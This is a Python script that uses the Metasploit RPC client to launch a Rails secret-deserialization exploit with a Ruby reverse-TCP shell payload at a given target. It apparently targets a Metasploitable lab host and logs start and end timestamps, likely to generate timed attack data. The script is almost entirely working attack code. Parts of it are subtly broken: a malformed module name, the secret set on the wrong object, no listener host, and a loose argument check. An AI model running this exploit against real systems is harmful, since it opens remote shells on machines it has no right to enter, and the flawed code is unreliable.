import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip duration".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')

    exploit = client.modules.use('exploit', 'use multi/http/rails_secret_deserialization')
    payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')

    exploit['COOKIE_NAME'] = "_metasploitable"
    exploit['RHOSTS'] = target_ip
    exploit['RPORT'] = 8181
    payload['SECRET'] = "a7aebc287bba0ee4e64f947415a94e5f"

    output_time_file = 'time_stage_1_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)
    #print('Start 1')

    exploit.execute(payload=payload)

    time.sleep(10)
    output_time_file = 'time_stage_1_end.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)


main(sys.argv)
